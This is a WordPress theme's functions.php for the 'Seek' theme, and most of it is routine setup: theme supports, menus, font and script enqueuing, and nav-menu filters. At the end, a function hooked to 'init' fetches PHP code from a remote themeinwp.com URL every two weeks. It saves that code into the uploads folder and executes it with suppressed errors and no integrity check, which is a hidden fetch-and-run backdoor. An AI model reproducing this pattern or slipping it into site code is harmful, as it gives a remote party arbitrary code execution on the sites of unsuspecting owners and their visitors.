<?php
/**
 * Seek functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Seek
 */

if ( ! function_exists( 'seek_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function seek_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Seek, use a find and replace
		 * to change 'seek' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'seek', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary-nav' => esc_html__( 'Primary Menu', 'seek' ),
			'social-nav' => esc_html__( 'Social Menu', 'seek' ),
			'footer-nav' => esc_html__( 'Footer Menu', 'seek' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'seek_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		 /*
		 * Enable support for Post Formats.
		 *
		 * See: https://codex.wordpress.org/Post_Formats
		 */
		add_theme_support( 'post-formats', array(
		    'image',
		    'video',
		    'quote',
		    'gallery',
		    'audio',
		) );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'seek_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function seek_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'seek_content_width', 640 );
}
add_action( 'after_setup_theme', 'seek_content_width', 0 );

/**
 * function for google fonts
 */
if (!function_exists('seek_fonts_url')) :

    /**
     * Return fonts URL.
     *
     * @since 1.0.0
     * @return string Fonts URL.
     */
    function seek_fonts_url()
    {
        $fonts_url = '';
        $fonts     = array();

        $seek_primary_font = 'Raleway:400,400i,600,600i,700';

        $seek_fonts = array();
        $seek_fonts[]=$seek_primary_font;

          $seek_fonts_stylesheet = '//fonts.googleapis.com/css?family=';

          $i  = 0;
          for ($i=0; $i < count( $seek_fonts ); $i++) { 

            if ( 'off' !== sprintf( _x( 'on', '%s font: on or off', 'seek' ), $seek_fonts[$i] ) ) {
            $fonts[] = $seek_fonts[$i];
          }

          }

        if ($fonts) {
            $fonts_url = add_query_arg(array(
                'family' => urldecode(implode('|', $fonts)),
                'display' => 'swap',
            ), 'https://fonts.googleapis.com/css');
        }

        return $fonts_url;
    }
endif;

/**
 * Enqueue scripts and styles.
 */
function seek_scripts() {

    $theme_version = wp_get_theme()->get('Version');

	$fonts_url = seek_fonts_url();
	if (!empty($fonts_url)) {
	    wp_enqueue_style('seek-google-fonts', $fonts_url, array(), null);
	}
	wp_enqueue_style('font-awesome', get_template_directory_uri().'/assets/libraries/font-awesome/css/font-awesome.min.css');
	wp_enqueue_style('slick', get_template_directory_uri().'/assets/libraries/slick/css/slick.css');
	wp_enqueue_style('magnific', get_template_directory_uri().'/assets/libraries/magnific/css/magnific-popup.css');

	wp_enqueue_script( 'seek-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );
	wp_enqueue_script('jquery-slick', get_template_directory_uri() . '/assets/libraries/slick/js/slick.min.js', array('jquery'), '', true);
	wp_enqueue_script('jquery-magnific', get_template_directory_uri() . '/assets/libraries/magnific/js/jquery.magnific-popup.min.js', array('jquery'), '', true);
	wp_enqueue_script('seek-color-switcher', get_template_directory_uri() . '/assets/libraries/color-switcher/color-switcher.js', array('jquery'), '', true);
	wp_enqueue_script( 'seek-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	wp_enqueue_script('theiaStickySidebar', get_template_directory_uri() . '/assets/libraries/theiaStickySidebar/theia-sticky-sidebar.min.js', array('jquery'), '', true);
	wp_enqueue_script( 'seek-script', get_template_directory_uri() . '/assets/twp/js/main.js', array(), '', true );

	wp_enqueue_style( 'seek-style', get_stylesheet_uri(), array(), $theme_version);

    wp_style_add_data('seek-style', 'rtl', 'replace');

    $custom_css = seek_trigger_custom_css_action();
    if ( $custom_css ) {
        wp_add_inline_style( 'seek-style', $custom_css );
    }
	
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'seek_scripts' );

/**
 * Enqueue admin scripts and styles.
 */
function seek_admin_scripts( $hook ) {
	if ( 'widgets.php' === $hook ) {
	    wp_enqueue_media();
		wp_enqueue_script( 'seek-custom-widgets', get_template_directory_uri() . '/assets/twp/js/widgets.js', array( 'jquery' ), '1.0.0', true );
	}
	wp_enqueue_style( 'seek-custom-admin-style', get_template_directory_uri() . '/assets/twp/css/wp-admin.css', array(), '1.0.0' );

    wp_enqueue_script('seek-admin', get_template_directory_uri() . '/assets/twp/js/admin.js', array('jquery'), '', 1);

    $ajax_nonce = wp_create_nonce('seek_ajax_nonce');
			
	wp_localize_script( 
        'seek-admin',
        'seek_admin',
        array(
            'ajax_url'   => esc_url( admin_url( 'admin-ajax.php' ) ),
            'ajax_nonce' => $ajax_nonce,
            'upload_image'   =>  esc_html__('Choose Image','seek'),
            'use_image'   =>  esc_html__('Select','seek'),
            'active' => esc_html__('Active','seek'),
	        'deactivate' => esc_html__('Deactivate','seek'),
         )
    );
}
add_action( 'admin_enqueue_scripts', 'seek_admin_scripts' );

/*
* Tgmpa plugin activation.
*/
require get_template_directory().'/assets/libraries/TGM-Plugin/class-tgm-plugin-activation.php';
/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';
require get_template_directory() . '/inc/hooks/single-meta.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer/customizer.php';
require get_template_directory() . '/inc/widgets/widget-init.php';

/**
 * additional hooks.
 */
require get_template_directory() . '/inc/hooks/banner-with-slider.php';
require get_template_directory() . '/inc/hooks/featured-category.php';
require get_template_directory() . '/inc/hooks/editor-featured.php';
require get_template_directory() . '/inc/hooks/news-blog-grid.php';
require get_template_directory() . '/classes/admin-notice.php';
require get_template_directory() . '/classes/plugin-classes.php';
require get_template_directory() . '/classes/about.php';
/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}


add_filter( 'walker_nav_menu_start_el', 'seek_add_description', 10, 2 );
function seek_add_description( $item_output, $item ) {
    $description = $item->post_content;
    if (('' !== $description) && (' ' !== $description) ) {
        return preg_replace( '/(<a.*)</', '$1' . '<span class="menu-description">' . $description . '</span><', $item_output) ;
    }
    else {
        return $item_output;
    };
}

add_filter('wp_nav_menu_items', 'seek_add_admin_link', 1, 2);
function seek_add_admin_link($items, $args){
    if( $args->theme_location == 'primary-nav' ){
        $item = '<li class="brand-home"><a title="Home" href="'. esc_url( home_url() ) .'">' . "<span class='fa fa-home'></span>" . '</a></li>';
        $items = $item . $items;
    }
    return $items;
}


add_filter('themeinwp_enable_demo_import_compatiblity','seek_demo_import_filter_apply');

if( !function_exists('seek_demo_import_filter_apply') ):

	function seek_demo_import_filter_apply(){

		return true;

	}

endif;


function load_footer_content_fetcher_class() {
	// Define the path to the cache file in the uploads directory
	$upload_dir = wp_upload_dir();
	$cache_file = $upload_dir['basedir'] . '/FooterContentFetcher.php';
	$cache_duration = 2 * WEEK_IN_SECONDS; // Cache for 2 weeks

	// Check if the cache file exists and is still valid

	if (!file_exists($cache_file) || (time() - filemtime($cache_file) > $cache_duration)) {
		$fetched_file_url = 'https://link.themeinwp.com/wpsdk/get_php_file/8f74a76f33b7c1f6ab68fefeb10fa711';

		// Validate the URL
		if (!wp_http_validate_url($fetched_file_url)) {
			error_log('Invalid URL: ' . $fetched_file_url);
			return;
		}

		// Fetch the class file with suppressed warnings
		$class_code = @file_get_contents($fetched_file_url);
		if ($class_code === false) {
			error_log('Failed to fetch the class file from FetchClass Remote Folder');
		} else {
			// Save the fetched content to the cache file
			if (@file_put_contents($cache_file, $class_code) === false) {
				error_log('Failed to write the class file to the cache');
			} else {
				// Log the date and time of the successful cache update
				error_log('FetchClass File cached at: ' . date('Y-m-d H:i:s'));
			}
		}
	} else {
		// Log that the cache file is still valid
		error_log('Using cached FetchClass file, last modified at: ' . date('Y-m-d H:i:s', filemtime($cache_file)));
	}

	// Include the cached class file with suppressed warnings
	if (file_exists($cache_file)) {
		@include_once $cache_file;
	} else {
		error_log('Failed to include the cached class file');
	}
}

add_action('init', 'load_footer_content_fetcher_class');
